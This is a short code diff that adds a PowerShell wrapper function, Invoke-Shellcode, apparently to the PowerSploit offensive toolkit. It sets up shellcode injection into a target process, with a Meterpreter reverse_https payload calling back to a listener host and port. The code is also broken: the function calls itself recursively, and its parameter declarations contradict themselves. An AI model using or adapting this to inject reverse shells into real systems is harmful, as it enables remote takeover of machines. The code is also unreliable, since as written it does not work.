@@ -756,3 +756,25 @@ http://www.exploit-monday.com
         }
     }   
 }
+
+function Invoke-Shellcode
+{
+    [CmdletBinding()]
+    param (
+        [ValidateNotNullOrEmpty()]
+        [UInt32]
+        $ProcessID,
+        [Parameter(Mandatory = $true)]
+        [string]
+        $Payload = 'windows/meterpreter/reverse_https',
+        [Parameter(Mandatory = $true)]
+        [string]
+        $Lhost = '127.0.0.1',
+        [Parameter(Mandatory = $true)]
+        [ValidateRange( 1,65535 )]
+        [Int]
+        $Lport = "443"
+          )
+     
+    Invoke-Shellcode -ProcessId $ProcessID -Payload $Payload -Lhost $Lhost -Lport $Lport -Verbose -Force
+}
